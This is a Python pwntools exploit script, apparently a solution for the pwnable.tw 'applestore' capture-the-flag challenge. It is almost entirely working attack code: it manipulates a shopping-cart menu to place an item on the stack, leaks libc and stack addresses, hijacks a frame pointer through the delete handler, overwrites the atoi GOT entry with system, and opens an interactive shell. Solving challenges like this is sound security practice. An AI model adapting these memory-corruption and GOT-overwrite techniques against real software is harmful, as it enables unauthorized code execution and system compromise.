#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

ready = True
if ready:
    conn = connect('chall.pwnable.tw', 10104)
else:
    conn = process('/home/doublesine/Desktop/applestore')

def connRead():
    sleep(0.3)
    read = conn.read()
    print read,
    return read

def connSendRaw(s):
    conn.send_raw(s)
    print s,

myCart_addr = 0x0804B068
atoi_GOT_PLT_addr = 0x0804B040

libc_atoi_addr = 0x0002D050
libc_system_addr = 0x0003A940

# we need 20 * [iPhone 6 Plus] and 6 * [iPhone 6 Plus] to reach 7174
# === Device List ===
# 1: iPhone 6 - $199
# 2: iPhone 6 Plus - $299
# 3: iPad Air 2 - $499
# 4: iPad Mini 3 - $399
# 5: iPod Touch - $199
for i in range(0, 20):
    connRead()
    connSendRaw('2\n')
    connRead()
    connSendRaw('2\n')

for i in range(0, 6):
    connRead()
    connSendRaw('2\n')
    connRead()
    connSendRaw('1\n')

# goto checkout
# so applestore will give us a [iPhone 8] which needs only $1
connRead()
connSendRaw('5\n')
connRead()
connSendRaw('y\n')

# delete first 26 items
for i in range(0, 26):
    connRead()
    connSendRaw('3\n')
    connRead()
    connSendRaw('1\n')

# goto cart
# so we can modify the last item which is on stack to leak address of atoi
connRead()
connSendRaw('4\n')
connRead()
connSendRaw('y\x00' + pack(atoi_GOT_PLT_addr, 32) + pack(7174, 32) + pack(0, 32) + pack(0, 32) + '\n')
sleep(0.3)
read0 = conn.readuntil('1: ')
read1 = conn.readuntil('\n')
read2 = conn.read()
libc_reloc_offset = unpack(read1[0:4], 32) - libc_atoi_addr
libc_atoi_addr += libc_reloc_offset
libc_system_addr += libc_reloc_offset
print read0,
print read1,
print('[*] libc_reloc_offset = 0x%08x' % libc_reloc_offset)
print('[*] libc_atoi_addr = 0x%08x' % libc_atoi_addr)
print('[*] libc_system_addr = 0x%08x' % libc_system_addr)
print read2,

# goto cart again
# so we can leak the address of the item
connSendRaw('4\n')
connRead()
connSendRaw('y\x00' + pack(myCart_addr + 8, 32) + pack(7174, 32) + pack(0, 32) + pack(0, 32) + '\n')
sleep(0.3)
read0 = conn.readuntil('1: ')
read1 = conn.readuntil('\n')
read2 = conn.read()
stack_item_addr = unpack(read1[0:4], 32)
cart_ebp = stack_item_addr + 0x20
print read0,
print read1,
print('[*] stack_item_addr = 0x%08x' % stack_item_addr)
print('[*] cart_ebp = 0x%08x' % cart_ebp)
print read2,

# goto delete
# to hijack handler's ebp
connSendRaw('3\n')
connRead()
connSendRaw('1\x00' + pack(0, 32) + pack(0, 32) + pack(cart_ebp - 0xC, 32) + pack(atoi_GOT_PLT_addr + 0x22, 32) + '\n')

# write libc_system_addr to dword ptr [atoi_GOT_PLT_addr]
# so we can change 'atoi' to 'system'
connRead()
connSendRaw(pack(libc_system_addr) + '||/bin/sh\n')

conn.interactive()  # you will get shell here
conn.close()
